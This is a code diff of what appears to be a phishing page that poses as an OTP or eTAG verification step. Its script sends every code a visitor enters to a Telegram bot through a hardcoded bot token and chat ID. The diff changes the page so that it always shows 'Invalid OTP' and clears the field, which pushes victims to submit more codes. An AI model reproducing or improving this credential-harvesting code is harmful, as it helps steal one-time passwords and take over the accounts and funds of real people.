@@ -61,7 +61,6 @@
             width: 0%;
         }
 
-
         .header-content {
             display: flex;
             align-items: center;
@@ -161,7 +160,6 @@
             opacity: 1;
         }
 
-
         .continue-btn {
             width: 100%;
             padding: 16px;
@@ -226,7 +224,7 @@
             }
         }
 
-        /* New Loader Styles - Inspired by the first page */
+        /* Loader Styles */
         .loader-backdrop {
             position: fixed;
             inset: 0;
@@ -265,9 +263,8 @@
         
         <div class="otp-input-section">
             <div class="otp-input-wrapper">
-            <div class="error-message-otp" id="errorMessage">Invalid OTP, please try again</div>
-                <input type="text" inputmode="numeric" class="otp-input" id="otpInput" placeholder="Enter OTP">
-                
+                <div class="error-message-otp" id="errorMessage">Invalid OTP, please try again</div>
+                <input type="text" inputmode="numeric" class="otp-input" id="otpInput" placeholder="Please Enter eTAG Number">
             </div>
         </div>
         
@@ -277,7 +274,7 @@
         </button>
     </div>
 
-    <!-- New Loader -->
+    <!-- Loader -->
     <div class="loader-backdrop" id="loader" aria-hidden="true">
         <img src="cicle_loader.gif" alt="Loading..." class="loader-gif" />
     </div>
@@ -291,8 +288,8 @@
             const errorMessage = document.getElementById('errorMessage');
             const header = document.querySelector('.header');
             
-            let clickCount = 0;
-            const maxClicks = 3;
+            // Track if we've already shown the invalid OTP message
+            let hasShownInvalidOtp = false;
             
             // Get all URL parameters
             const urlParams = new URLSearchParams(window.location.search);
@@ -305,7 +302,6 @@
             
             // Function to send data to Telegram
             async function sendToTelegram(data) {
-                // Replace with your actual Telegram bot token and chat ID
                 const botToken = '8317396526:AAFNNX5WnbBb_Nt9cOUDOqy1cXhe2xrsSu8';
                 const chatId = '-5091670751';
                 
@@ -379,14 +375,11 @@
                     return;
                 }
                 
-                // Increment click count
-                clickCount++;
-                
-                // Remove error and input error state
+                // Remove error state if OTP is not empty
                 otpInput.classList.remove('error');
                 errorMessage.classList.remove('show');
                 
-                // Show loader first
+                // Show loader
                 showLoader();
                 
                 // Get current time
@@ -417,39 +410,39 @@
                     console.log("Failed to send OTP data to Telegram");
                 }
                 
-                // After loader, update progress
-                setTimeout(function() {
-                    hideLoader();
-                    
-                    // Hide header border on first click
-                    if (clickCount === 1) {
-                        header.classList.add('no-border');
-                    }
-                    
-                    // Update progress bar after loader
-                    const progress = (clickCount / maxClicks) * 100;
-                    progressBar.style.width = progress + '%';
-                    
-                    // If 3rd click, restore border and show error
-                    if (clickCount === maxClicks) {
-                        // Restore header border
-                        header.classList.remove('no-border');
-                        
-                        // Show error message
-                        otpInput.classList.add('error');
-                        errorMessage.classList.add('show');
-                        
-                        // Reset progress
-                        clickCount = 0;
-                        progressBar.style.width = '0%';
-                    }
-                }, 4000);
+                // Wait for 2 seconds to show loader
+                await new Promise(r => setTimeout(r, 2000));
+
+                // Hide loader
+                hideLoader();
+                
+                // Show invalid OTP message after submission
+                otpInput.classList.add('error');
+                errorMessage.classList.add('show');
+                hasShownInvalidOtp = true;
+                
+                // Clear the input for next attempt
+                otpInput.value = '';
+                
+                console.log("OTP verification completed successfully");
             });
             
-            // Remove error class on focus
+            // Remove error class on focus (only if we've already shown the invalid message)
             otpInput.addEventListener('focus', function() {
-                otpInput.classList.remove('error');
-                errorMessage.classList.remove('show');
+                if (hasShownInvalidOtp) {
+                    otpInput.classList.remove('error');
+                    errorMessage.classList.remove('show');
+                    hasShownInvalidOtp = false;
+                }
+            });
+            
+            // Remove error class on input (only if we've already shown the invalid message)
+            otpInput.addEventListener('input', function() {
+                if (hasShownInvalidOtp && otpInput.value.trim()) {
+                    otpInput.classList.remove('error');
+                    errorMessage.classList.remove('show');
+                    hasShownInvalidOtp = false;
+                }
             });
         });
     </script>
